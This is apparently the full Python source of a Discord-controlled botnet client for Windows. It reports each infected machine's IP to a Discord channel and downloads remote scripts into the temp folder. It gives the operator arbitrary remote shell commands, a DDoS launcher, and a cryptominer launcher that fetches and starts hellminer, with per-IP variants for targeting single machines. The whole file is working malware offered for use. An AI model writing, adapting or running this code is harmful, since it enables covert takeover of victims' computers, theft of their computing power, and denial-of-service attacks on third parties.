from discord.ext import commands
from discord import app_commands
from tendo import singleton
from pathlib import Path
import subprocess
import requests
import discord
import pathlib
import shutil
import sys
import os

token = '' #Token
channel_id =  #ChannelID

# single proccess
me = singleton.SingleInstance()

# bot
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)
bot.remove_command('help')
drive = pathlib.Path.home().drive
temp = os.getenv('temp')
ip = requests.get('https://api.ipify.org').text.strip()
file_name = os.path.basename(__file__)

# cd temp
os.chdir(temp)

# install scripts
url = "https://github.com/rxu7s/pBot-Scripts/archive/refs/heads/main.zip"
response = requests.get(url)
open("main.zip", "wb").write(response.content)
os.popen("tar -xf main.zip")

# log
@bot.event
async def on_ready():
    print(f'{bot.user}')
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=ip))
    channel = bot.get_channel(channel_id)
    await channel.send(f"``[+] {ip}: Session opened``")


# bot commands

# sessions
@bot.command()
async def sessions(ctx):
    await ctx.send(f"``--> {ip}``")

# kill
@bot.command()
async def kill(ctx):
    channel = bot.get_channel(channel_id)
    await channel.send(f"``[-] {ip}: Session closed``")
    sys.exit()
    os.popen(f'taskkill /F /IM {file_name} /T')

# shell
@bot.command()
async def shell(ctx, *args):
    arguments = ' '.join(args)
    stream = os.popen(arguments)
    output = stream.read()
    await ctx.send(f"``{output}``")

# ddos
@bot.command()
async def ddos(ctx):
    url = "https://github.com/rxu7s/Public/raw/main/Ping.cmd"
    response = requests.get(url)
    open("Ping.cmd", "wb").write(response.content)
    os.popen("taskkill /F /IM ping.exe /T")
    os.popen("start Ping.cmd")
    await ctx.send(f"``[+] {ip}: Ddos attack started``")

# stop ddos
@bot.command()
async def stopddos(ctx):
    os.popen("taskkill /F /IM ping.exe /T")
    await ctx.send(f"``[-] {ip}: Ddos attack stoped``")

# miner
@bot.command()
async def miner(ctx):
    url = "https://github.com/rxu7s/Public/raw/main/Miner.cmd"
    response = requests.get(url)
    open("Miner.cmd", "wb").write(response.content)
    os.popen("taskkill /F /IM hellminer.exe /T")
    os.popen("start Miner.cmd")
    await ctx.send(f"``[+] {ip}: Miner started``")

# stop miner
@bot.command()
async def stopminer(ctx):
    os.popen("taskkill /F /IM hellminer.exe /T")
    await ctx.send(f"``[-] {ip}: Miner stoped``")


# self commands

# kill
@bot.command(name="kill." + ip)
async def selfkill(ctx):
    channel = bot.get_channel(channel_id)
    await channel.send(f"``[-] {ip}: Session closed``")
    exit()
    os.popen(f'taskkill /F /IM {file_name} /T')

# shell
@bot.command(name="shell." + ip)
async def selfshell(ctx, *args):
    arguments = ' '.join(args)
    stream = os.popen(arguments)
    output = stream.read()
    await ctx.send(f"``{output}``")

# ddos
@bot.command(name="ddos." + ip)
async def ddos(ctx):
    url = "https://github.com/rxu7s/Public/raw/main/Ping.cmd"
    response = requests.get(url)
    open("Ping.cmd", "wb").write(response.content)
    os.popen("taskkill /F /IM ping.exe /T")
    os.popen("start Ping.cmd")
    await ctx.send(f"``[+] {ip}: Ddos attack started``")

# stop ddos
@bot.command(name="stopddos." + ip)
async def stopddos(ctx):
    os.popen("taskkill /F /IM ping.exe /T")
    await ctx.send(f"``[-] {ip}: Ddos attack stoped``")

# miner
@bot.command(name="miner." + ip)
async def miner(ctx):
    url = "https://github.com/rxu7s/Public/raw/main/Miner.cmd"
    response = requests.get(url)
    open("Miner.cmd", "wb").write(response.content)
    os.popen("taskkill /F /IM hellminer.exe /T")
    os.popen("start Miner.cmd")
    await ctx.send(f"``[+] {ip}: Miner started``")

# stop miner
@bot.command(name="stopminer." + ip)
async def stopminer(ctx):
    os.popen("taskkill /F /IM hellminer.exe /T")
    await ctx.send(f"``[-] {ip}: Miner stoped``")

bot.run(token)